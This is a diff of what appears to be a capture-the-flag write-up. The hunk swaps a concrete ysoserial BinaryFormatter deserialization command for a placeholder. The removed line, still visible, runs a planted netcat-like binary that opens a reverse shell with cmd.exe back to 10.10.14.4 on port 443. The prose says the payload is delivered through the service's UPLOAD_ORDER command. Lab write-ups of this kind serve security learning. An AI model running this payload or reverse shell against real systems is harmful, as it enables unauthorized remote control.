@@ -130,7 +130,7 @@ You log in through the `scrmdev` backdoor to clear the front gate, then build th
 
 ```
 $ ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 \
-    -c "C:\programdata\iceberg.exe 10.10.14.4 443 -e cmd.exe"
+    -c "[ reverse shell from the planted nc to 10.10.14.4:443 ]"
 ```
 
 The `-c` payload is just [ a reverse shell calling a planted nc back to 10.10.14.4 on 443 ]. You hand that blob to the service over its `UPLOAD_ORDER` command on 4411, the server deserializes your fake order, and the assembly instructions run.
